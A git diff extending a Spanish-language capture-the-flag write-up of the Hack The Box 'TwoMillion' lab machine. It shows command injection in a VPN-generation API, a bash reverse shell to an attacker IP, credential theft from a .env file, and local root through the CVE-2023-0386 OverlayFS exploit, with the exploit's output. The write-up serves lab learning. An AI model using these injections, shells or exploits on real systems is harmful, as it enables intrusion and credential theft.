@@ -43,6 +43,13 @@ El siguiente comando nos ayuda a escanear los puertos abiertos de la máquina v�
        │ in 13.62 seconds
 
 ```
+Hoy aprendí a escanear los puertos de nuevo con nmap pero con los siguientes parametros, para obtener mas información de los servicios en dichos puertos, el comando es el siguiente:
+
+```
+sudo nmap -sC -sV -oA twoMillion -p 22,80 10.10.11.221
+
+```
+
 
 
 
@@ -214,5 +221,169 @@ Nos vuelve a pedir otro paremetro, esta vez, is_admin tiene que ser 1 o 0, a cha
 
 Estabamos en lo correcto, ahora obtenemos un true, confirmando lo anterior.
 
+## Ya con una posición establecida
 
+Veamos la URL "/admin/vpn/generate" ya que tenemos los permisos suficientes 
+
+![](/assets/images/htb-writeup-twoMillion/hold1.png)
+
+El resultado nos dice que falta el parametro "username". Hasta este podemos inferir que este es el username del usuario de la VPN que vamos a generar, entonces intentemos ingresar un username random 
+
+![](/assets/images/htb-writeup-twoMillion/hold2.png)
+
+Despues de enviar el comando vemos el archivo de VPN que se genero hacia el usuario tst y nos lo ha impreso en la consola. Si esta VPN ha sido generada via "exec" o "system" con la función PHP y no hay demasado filtrado es posible poder inyectar código malicioso en el campo de username y ganar un enlace remoto al sistema.
+Intentemos hacerlo inyectando el comando ";id;" después de username.
+
+![](/assets/images/htb-writeup-twoMillion/hold2.png)
+
+Pues ha funcionado, ahora iniciemos Netcat para ponernos en escucha en un puerto y ver si podemos obtener una shell.
+
+```
+nc -lvp 3333
+```
+Podemos obtener una shell con lo siguiente 
+
+```
+bash -i >& /dev/tcp/10.10.16.14/3333 0>&1
+```
+Lo codificamos en base64 y lo añadimos a la cadena del header
+
+
+![](/assets/images/htb-writeup-twoMillion/hold4.png)
+
+![](/assets/images/htb-writeup-twoMillion/hold5.png)
+
+## Movimiento lateral
+
+Al listar dentro del directorio de la web, podemos observar que hay un archivo .env que contiene credenciales de un usuario llamado admin
+
+![](/assets/images/htb-writeup-twoMillion/lateral1.png)
+
+Y al ingresar al archivo "/etc/passwd" podemos ver que efectivamente hay un usuario con nombre admin
+
+![](/assets/images/htb-writeup-twoMillion/lateral2.png)
+
+Lo que podemos hacer es intentar logearnos via ssh con el nombre y la contraseña proporcionados
+
+![](/assets/images/htb-writeup-twoMillion/lateral3.png)
+
+¡Al fin conseguimos entrar al usuario de la máquina! ahora podemos conseguir la primera bandera dentro de /home/admin 
+
+![](/assets/images/htb-writeup-twoMillion/lateral4.png)
+
+## Escalar privilegios 
+
+Pero aun nos queda consegui la bandera de root, para esto necesitamos escalar en privilegios.
+
+Si nos ponemos a usmear los correos del usuario en /var/mail/admin podemos leer algunos de ellos
+
+![](/assets/images/htb-writeup-twoMillion/privilegio1.png)
+
+Al parecer un tal ch4p nos mando un mail diciendo que deberíamos hacer actualizaciones en este sistema ya que ha habido algunos exploits seriamente comprometedores recientemente, mas especificamente "OverlayFS/FUSE".
+
+Si hacemos una busqueda rápida en Google con las palabras "overlays fuse exploit". podemos ver en este artículo acerca de un exploit asigando como CVE-2023-0386.
+
+```
+https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/
+```
+
+Nos dice que es un exploit del kernel de Linux, mas busquedas nos revelan esto: 
+
+
+```
+https://ubuntu.com/security/CVE-2023-0386
+```
+Y listando la versión actual del kernel de la máquina victima nos dice que tnenemos la versión 5.15.70
+
+```
+admin@2million:/var/mail$ uname -a
+Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+El explot afecta a las máquina que tienen una version 5.15.0-70.77 y ya hemos visto que la máquina tiene una version que puede ser vulnerable a este exploit.
+
+Lo que nos toca hacer ahora es clonar algun script que nos permita vulnerar 
+
+```
+https://github.com/xkaneiki/CVE-2023-0386
+```
+
+Usare este repositorio, lo clonare y lo comprimire 
+
+```
+git clone https://github.com/xkaneiki/CVE-2023-0386
+
+zip -r cve.zip CVE-2023-0386/
+```
+Ahora lo subiremos usando scp 
+
+```
+scp cve.zip admin@2million.htb:/tmp
+```
+Dentro de la máquina como usario admin entremos al directorio /tmp y lo descomprimimos
+
+
+```
+cd /tmp 
+
+unzip cve.zip
+```
+Ahora seguiremos los pasos que nos dice el README en el github del exploit, nos meteremos y usaremos make all 
+
+```
+admin@2million:/tmp$ cd CVE-2023-0386/
+admin@2million:/tmp/CVE-2023-0386$ make all
+
+```
+Después ejecutaremos el exploit en segundo plano con el siguiente comando 
+
+```
+admin@2million:/tmp/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc &
+[1] 23724
+admin@2million:/tmp/CVE-2023-0386$ [+] len of gc: 0x3ee0
+
+```
+Ahora usaremos el exploit 
+
+```
+./exp
+uid:1000 gid:1000
+[+] mount success
+[+] readdir
+[+] getattr_callback
+/file
+total 8
+drwxrwxr-x 1 root   root     4096 Mar 16 02:36 .
+drwxr-xr-x 6 root   root     4096 Mar 16 02:36 ..
+-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
+[+] open_callback
+/file
+[+] read buf callback
+offset 0
+size 16384
+path /file
+[+] open_callback
+/file
+[+] open_callback
+/file
+[+] ioctl callback
+path /file
+cmd 0x80086601
+[+] exploit success!
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+root@2million:/tmp/CVE-2023-0386# id
+uid=0(root) gid=0(root) groups=0(root),1000(admin)
+root@2million:/tmp/CVE-2023-0386# 
+
+```
+Y listo, ya hemos escalado privilegios, podemos encontrar la flag en la carpeta de /root/
+
+Existe un mensaje encriptado del Team HackTheBox en el archivo "thank_you.json", pero eso lo dejare como incognita para el que quiera leerlo.
+
+Este ha sido mi primera máquina que he documentado, aunque ha sido fácil, es un poco laboriosa.
+Gracias por leer hasta aqui, cualquier duda puedes escribirme en las redes que tengo en esta página. ¡Seguiremos con más!
+
+![](/assets/images/htb-writeup-twoMillion/Bye.gif)
 
